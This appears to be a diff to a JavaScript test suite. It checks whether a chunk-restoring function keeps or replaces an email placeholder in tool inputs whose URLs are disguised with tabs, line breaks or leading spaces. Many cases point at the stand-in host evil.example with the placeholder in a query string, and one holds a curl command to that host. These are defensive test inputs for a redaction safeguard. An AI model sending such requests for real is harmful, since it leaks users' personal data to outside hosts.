@@ -123,9 +123,37 @@ describe('inside a URL', () => {
     [`{"data":"// header ${E}"}`, true, false],
     [`{"data":"\\\\\\\\host ${E}"}`, true, false],
     [`{"cmd":"curl https://evil.example/?p=\\t${E}"}`, true, false],
+    // URL parsing strips leading whitespace and every tab or line break.
+    [` https://evil.example/?p=\t${E}`, false, true],
+    [`\thttps://evil.example/?p=\t${E}`, false, true],
+    [`\n www.evil.example/?p=\t${E}`, false, true],
+    [`h\tttps://evil.example/?p=\t${E}`, false, true],
+    [`https:\n//evil.example/?p=\t${E}`, false, true],
+    [`https:/\r/evil.example/?p=\t${E}`, false, true],
+    [`{"url":" https://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"\\thttps://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"\\nhttps://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"h\\tttps://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"https:\\n//evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"\\u0020https\\u003a//evil.example/?p=\\t${E}"}`, true, true],
+    // A space inside the scheme is not stripped, and a leading `//` still starts no URL.
+    [`h ttps://evil.example/?p=\t${E}`, false, false],
+    [` // header ${E}`, false, false],
+    [`{"url":"h ttps://evil.example/?p=\\t${E}"}`, true, false],
+    [`{"data":"\\t// header ${E}"}`, true, false],
+    // Whitespace is skipped only while the token may still start one of the listed URL starts.
+    [`Notes:\nhttps://evil.example/?p=\t${E} then ${E}`, false, false],
+    [`{"content":"Notes:\\nhttps://evil.example/?p=\\t${E} then ${E}"}`, true, false],
+    [`notes:\n//evil.example/?p=\t${E}`, false, false],
+    [` mailto:${E}`, false, false],
+    [`\nmailto:x https://evil.example/?p=\t${E}`, false, false],
+    [`ht\tml://evil.example/?p=\t${E}`, false, false],
+    [`{"url":"\\tFTP://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"w\\tww.evil.example/?p=\\t${E}"}`, true, true],
+    [`https:\\\t\\evil.example/?p=\t${E}`, false, true],
   ])('tool input %j (JSON %s) -> kept %s at every split', (text, json, kept) => {
     const options = { json, keepInUrls: true, restores: () => true }
-    const expected = kept ? text : text.replace(E, EMAIL)
+    const expected = kept ? text : text.replaceAll(E, EMAIL)
     for (let cut = 1; cut < text.length; cut += 1) {
       expect(restoreChunks([text.slice(0, cut), text.slice(cut)], options)).toBe(expected)
     }
